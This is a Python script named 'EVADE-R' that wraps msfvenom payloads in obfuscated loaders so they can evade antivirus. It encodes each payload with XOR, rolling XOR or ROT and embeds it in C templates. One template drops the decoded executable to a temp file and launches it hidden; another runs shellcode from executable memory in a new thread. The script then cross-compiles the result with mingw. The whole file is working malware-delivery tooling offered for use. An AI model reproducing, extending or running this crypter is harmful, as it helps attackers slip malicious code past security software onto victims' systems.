#!/usr/bin/env python3
import sys
import shlex
import subprocess
import random
import argparse
from pathlib import Path
import os

import lief

# ── Templates ────────────────────────────────────────────────────────────────

EXE_LOADER_C = r'''
#include <windows.h>
#include <stdint.h>
#include <stdio.h>

unsigned char payload[] = { {PAYLOAD_BYTES} };
const size_t payload_len = sizeof(payload);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd)
{
    // Decode
    for (size_t i = 0; i < payload_len; i++) {
        payload[i] ^= PAYLOAD_KEY;
    }

    // Create temp file name
    CHAR tmpPath[MAX_PATH + 1];
    if (! GetTempPathA(MAX_PATH, tmpPath)) return -1;
    CHAR tmpFile[MAX_PATH + 1];
    snprintf(tmpFile, MAX_PATH, "%stmp%lx.exe", tmpPath, GetTickCount());

    // Dump decoded EXE
    HANDLE f = CreateFileA(tmpFile,
                           GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return -2;
    DWORD written;
    WriteFile(f, payload, (DWORD)payload_len, &written, NULL);
    CloseHandle(f);

    // Launch it
    STARTUPINFOA si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi;
    if (! CreateProcessA(tmpFile, NULL, NULL, NULL, FALSE,
                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        return -3;
    }

    return 0;
}
'''

MEM_LOADER_C = r'''
#include <windows.h>
#include <stdint.h>

unsigned char shellcode[] = { {PAYLOAD_BYTES} };
size_t shellcode_len = sizeof(shellcode);

int main(void) {
    void *exec = VirtualAlloc(NULL, shellcode_len,
                              MEM_COMMIT|MEM_RESERVE,
                              PAGE_READWRITE);
    if (!exec) return -1;

    memcpy(exec, shellcode, shellcode_len);

    DWORD old;
    VirtualProtect(exec, shellcode_len,
                   PAGE_EXECUTE_READ, &old);

    HANDLE th = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)exec,
        NULL, 0, NULL);
    WaitForSingleObject(th, INFINITE);
    return 0;
}
'''

# ── Enhanced Templates ────────────────────────────────────────────────────────

# XOR with rolling key template
ROLLING_XOR_LOADER_C = r'''
#include <windows.h>
#include <stdint.h>
#include <stdio.h>

unsigned char payload[] = { {PAYLOAD_BYTES} };
const size_t payload_len = sizeof(payload);
const unsigned char key[] = { {KEY_BYTES} };
const size_t key_len = sizeof(key);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                 LPSTR lpCmdLine, int nShowCmd)
{
    // Decode with rolling XOR
    for (size_t i = 0; i < payload_len; i++) {
        payload[i] ^= key[i % key_len];
    }

    // Create temp file name
    CHAR tmpPath[MAX_PATH + 1];
    if (! GetTempPathA(MAX_PATH, tmpPath)) return -1;
    CHAR tmpFile[MAX_PATH + 1];
    snprintf(tmpFile, MAX_PATH, "%stmp%lx.exe", tmpPath, GetTickCount());

    // Dump decoded EXE
    HANDLE f = CreateFileA(tmpFile,
                         GENERIC_WRITE, 0, NULL,
                         CREATE_ALWAYS,
                         FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return -2;
    DWORD written;
    WriteFile(f, payload, (DWORD)payload_len, &written, NULL);
    CloseHandle(f);

    // Launch it
    STARTUPINFOA si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi;
    if (! CreateProcessA(tmpFile, NULL, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        return -3;
    }

    return 0;
}
'''

# ROT encoding template
ROT_LOADER_C = r'''
#include <windows.h>
#include <stdint.h>
#include <stdio.h>

unsigned char payload[] = { {PAYLOAD_BYTES} };
const size_t payload_len = sizeof(payload);
const unsigned char shift = {ROT_SHIFT};

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                 LPSTR lpCmdLine, int nShowCmd)
{
    // Decode with ROT
    for (size_t i = 0; i < payload_len; i++) {
        payload[i] = (payload[i] - shift) & 0xFF;
    }

    // Create temp file name
    CHAR tmpPath[MAX_PATH + 1];
    if (! GetTempPathA(MAX_PATH, tmpPath)) return -1;
    CHAR tmpFile[MAX_PATH + 1];
    snprintf(tmpFile, MAX_PATH, "%stmp%lx.exe", tmpPath, GetTickCount());

    // Dump decoded EXE
    HANDLE f = CreateFileA(tmpFile,
                         GENERIC_WRITE, 0, NULL,
                         CREATE_ALWAYS,
                         FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return -2;
    DWORD written;
    WriteFile(f, payload, (DWORD)payload_len, &written, NULL);
    CloseHandle(f);

    // Launch it
    STARTUPINFOA si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi;
    if (! CreateProcessA(tmpFile, NULL, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        return -3;
    }

    return 0;
}
'''

# ── Helpers ────────────────────────────────────────────────────────────────

def random_key() -> int:
    return random.randrange(1, 0x100)

def random_keys(length: int) -> list:
    """Generate a list of random keys for more complex encoding"""
    return [random.randrange(1, 0x100) for _ in range(length)]

def xor_bytes(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)

def xor_rolling_bytes(data: bytes, key_list: list) -> bytes:
    """XOR with a rolling key for better obfuscation"""
    result = bytearray(len(data))
    for i, b in enumerate(data):
        result[i] = b ^ key_list[i % len(key_list)]
    return bytes(result)

def rot_bytes(data: bytes, shift: int) -> bytes:
    """Rotate bytes by shift amount"""
    return bytes((b + shift) & 0xFF for b in data)

def compile_c(code: str, out_exe: Path, compiler: str):
    c_path = Path("session_stub.c")
    c_path.write_text(code)
    cmd = [compiler, str(c_path), "-o", str(out_exe),
           "-O2", "-s", "-static", "-Wl,--subsystem,windows"]
    print(f"[*] Compiling: {' '.join(cmd)}")
    subprocess.run(cmd, check=True)
    print(f"[+] Built: {out_exe}")

# ── Obfuscation Pipelines ─────────────────────────────────────────────────

def obf_exe(payload_path: Path, choice: str = "1", custom_output: Path = None):
    data = payload_path.read_bytes()
    
    pe = lief.PE.parse(str(payload_path))
    m = pe.header.machine
    if m == lief.PE.Header.MACHINE_TYPES.AMD64:
        compiler = "x86_64-w64-mingw32-gcc"
        arch_s = "x64"
    elif m == lief.PE.Header.MACHINE_TYPES.I386:
        compiler = "i686-w64-mingw32-gcc"
        arch_s = "x86"
    else:
        sys.exit(f"[!] Unsupported PE machine: {m}")

    print(f"[*] Detected {arch_s} EXE → using {compiler}")
    
    # Setup output directory and file path
    if custom_output:
        out_exe = custom_output
        # Ensure the parent directory exists
        out_exe.parent.mkdir(parents=True, exist_ok=True)
    else:
        out_dir = Path("artifacts")/payload_path.stem
        out_dir.mkdir(parents=True, exist_ok=True)
        
        if choice == "1":
            out_exe = out_dir/f"obf_xor_{payload_path.name}"
        elif choice == "2":
            out_exe = out_dir/f"obf_roll_xor_{payload_path.name}"
        elif choice == "3":
            out_exe = out_dir/f"obf_rot_{payload_path.name}"
        else:
            out_exe = out_dir/f"obf_{payload_path.name}"
    
    if choice == "1":
        # Simple XOR encoding
        key = random_key()
        enc = xor_bytes(data, key)
        print(f"[*] XOR-key = 0x{key:02x}")
        
        bytes_list = ",".join(f"0x{b:02x}" for b in enc)
        code = EXE_LOADER_C.replace("{PAYLOAD_BYTES}", bytes_list)\
                           .replace("PAYLOAD_KEY", str(key))
        
    elif choice == "2":
        # Rolling XOR encoding (more complex)
        key_list = random_keys(16)  # Use a 16-byte rolling key
        key_str = ",".join(f"0x{k:02x}" for k in key_list)
        print(f"[*] Using 16-byte rolling XOR key")
        
        enc = xor_rolling_bytes(data, key_list)
        bytes_list = ",".join(f"0x{b:02x}" for b in enc)
        
        code = ROLLING_XOR_LOADER_C.replace("{PAYLOAD_BYTES}", bytes_list)\
                                   .replace("{KEY_BYTES}", key_str)
        
    elif choice == "3":
        # ROT encoding
        shift = random_key()
        enc = rot_bytes(data, shift)
        print(f"[*] ROT shift = {shift}")
        
        bytes_list = ",".join(f"0x{b:02x}" for b in enc)
        code = ROT_LOADER_C.replace("{PAYLOAD_BYTES}", bytes_list)\
                           .replace("{ROT_SHIFT}", str(shift))
    else:
        sys.exit(f"[!] Invalid choice: {choice}")

    compile_c(code, out_exe, compiler)
    return out_exe

def obf_shellcode(bin_path: Path, choice: str = "1", arch: str = "x64", custom_output: Path = None):
    raw = bin_path.read_bytes()
    print(f"[*] Embedding {len(raw)} bytes of shellcode")

    # Determine compiler based on architecture
    compiler = "x86_64-w64-mingw32-gcc" if arch=="x64" else "i686-w64-mingw32-gcc"

    # Setup output directory and file path
    if custom_output:
        out_exe = custom_output
        # Ensure the parent directory exists
        out_exe.parent.mkdir(parents=True, exist_ok=True)
    else:
        out_dir = Path("artifacts")/bin_path.stem
        out_dir.mkdir(parents=True, exist_ok=True)
        
        if choice == "1":
            out_exe = out_dir/f"obf_{bin_path.stem}_{arch}.exe"
        elif choice == "2":
            out_exe = out_dir/f"obf_xor_{bin_path.stem}_{arch}.exe"
        elif choice == "3":
            out_exe = out_dir/f"obf_roll_xor_{bin_path.stem}_{arch}.exe"
        else:
            out_exe = out_dir/f"obf_{bin_path.stem}_{arch}.exe"
    
    # Create a modified MEM_LOADER_C template with the chosen encoding
    if choice == "1":
        # No encoding
        bytes_list = ",".join(f"0x{b:02x}" for b in raw)
        code = MEM_LOADER_C.replace("{PAYLOAD_BYTES}", bytes_list)
        
    elif choice == "2":
        # Simple XOR encoding
        key = random_key()
        enc = xor_bytes(raw, key) 
        bytes_list = ",".join(f"0x{b:02x}" for b in enc)
        print(f"[*] XOR-key = 0x{key:02x}")
        
        # Create a modified shellcode loader with XOR decoding
        code = MEM_LOADER_C.replace("unsigned char shellcode[] = { {PAYLOAD_BYTES} };",
                                   f"unsigned char shellcode[] = {{ {bytes_list} }};")
        code = code.replace("memcpy(exec, shellcode, shellcode_len);", 
                           f"memcpy(exec, shellcode, shellcode_len);\n"
                           f"    // XOR decode\n"
                           f"    for(size_t i = 0; i < shellcode_len; i++) {{\n"
                           f"        ((unsigned char*)exec)[i] ^= {key};\n"
                           f"    }}")
        
    elif choice == "3":
        # Rolling XOR encoding
        key_list = random_keys(8)
        enc = xor_rolling_bytes(raw, key_list)
        bytes_list = ",".join(f"0x{b:02x}" for b in enc)
        key_str = ",".join(f"0x{k:02x}" for k in key_list)
        print(f"[*] Using 8-byte rolling XOR key")
        
        # Create a modified shellcode loader with rolling XOR decoding
        code = MEM_LOADER_C.replace("unsigned char shellcode[] = { {PAYLOAD_BYTES} };",
                                   f"unsigned char shellcode[] = {{ {bytes_list} }};\n"
                                   f"unsigned char key[] = {{ {key_str} }};\n"
                                   f"size_t key_len = sizeof(key);")
        code = code.replace("memcpy(exec, shellcode, shellcode_len);", 
                           f"memcpy(exec, shellcode, shellcode_len);\n"
                           f"    // Rolling XOR decode\n"
                           f"    for(size_t i = 0; i < shellcode_len; i++) {{\n"
                           f"        ((unsigned char*)exec)[i] ^= key[i % key_len];\n"
                           f"    }}")
    else:
        sys.exit(f"[!] Invalid choice: {choice}")

    compile_c(code, out_exe, compiler)
    return out_exe

# ── Main Interactive Session ────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(description="EVADE-R: MSFVenom Payload Obfuscator")
    parser.add_argument("-c", "--command", help="MSFVenom command to run")
    parser.add_argument("-i", "--input", help="Use existing payload file instead of generating new one")
    parser.add_argument("-o", "--output", help="Output filename")
    parser.add_argument("-e", "--encoder", type=int, choices=[1, 2, 3], 
                       help="Obfuscation method (1=XOR, 2=Rolling XOR, 3=ROT)")
    parser.add_argument("--cleanup", action="store_true", 
                       help="Remove original payload file after obfuscation")
    parser.add_argument("--no-interactive", action="store_true", 
                       help="Run in non-interactive mode with defaults")
    return parser.parse_args()

def main():
    args = parse_args()
    print("\n=== EVADE-R: MSFVenom + Obfuscator ===")
    
    # Get the payload file
    if args.input:
        out_file = Path(args.input)
        if not out_file.exists():
            sys.exit(f"[!] Input file not found: {out_file}")
    else:
        # Run msfvenom command
        if args.command:
            cmd = args.command
        else:
            cmd = input("Enter msfvenom command (with -o output):\n> ").strip()
            
        if not cmd:
            sys.exit("No command entered. Exiting.")

        if not cmd.startswith("msfvenom"):
            cmd = "msfvenom " + cmd

        print(f"[*] Running: {cmd}")
        subprocess.run(cmd, shell=True, check=True)

        # Extract output file from command
        cmd_args = shlex.split(cmd)
        try:
            o = cmd_args.index("-o")
            out_file = Path(cmd_args[o+1])
        except (ValueError, IndexError):
            sys.exit("[!] Could not parse -o <output> from your msfvenom command.")

        if not out_file.exists():
            sys.exit(f"[!] Output file not found: {out_file}")

    # Determine output path
    custom_output = None
    if args.output:
        custom_output = Path(args.output)
    
    # Process based on file type
    if out_file.suffix.lower() == ".exe":
        # Pre-select encoder if specified
        if args.no_interactive and args.encoder:
            choice = str(args.encoder)
        elif args.no_interactive:
            choice = "1"  # Default to simple XOR in non-interactive mode
        else:
            # Ask user which obfuscation technique to use in interactive mode
            print("\nSelect obfuscation technique:")
            print("1. Simple XOR (default)")
            print("2. Rolling XOR (better evasion)")
            print("3. ROT encoding")
            choice = input("Enter choice [1-3]: ").strip() or "1"
        
        final = obf_exe(out_file, choice, custom_output)
    else:
        # Pre-select encoder if specified
        if args.no_interactive and args.encoder:
            choice = str(args.encoder)
        elif args.no_interactive:
            choice = "1"  # Default to no encoding in non-interactive mode
        else:
            # Ask user which obfuscation technique to use in interactive mode
            print("\nSelect obfuscation technique for shellcode:")
            print("1. No encoding (default)")
            print("2. XOR encoding")
            print("3. Rolling XOR")
            choice = input("Enter choice [1-3]: ").strip() or "1"
        
        if args.no_interactive:
            arch = "x64"  # Default to x64 in non-interactive mode
        else:
            arch = ""
            while arch not in ("x86", "x64"):
                arch = input("Architecture (x86/x64): ").strip().lower()
                
        final = obf_shellcode(out_file, choice, arch, custom_output)

    print(f"\n[+] Obfuscated payload ready: {final}\n")
    
    # Cleanup if requested
    if args.cleanup and out_file.exists():
        try:
            os.remove(out_file)
            print(f"[+] Removed original payload file: {out_file}")
        except Exception as e:
            print(f"[!] Failed to remove original payload: {e}")

if __name__ == "__main__":
    main()
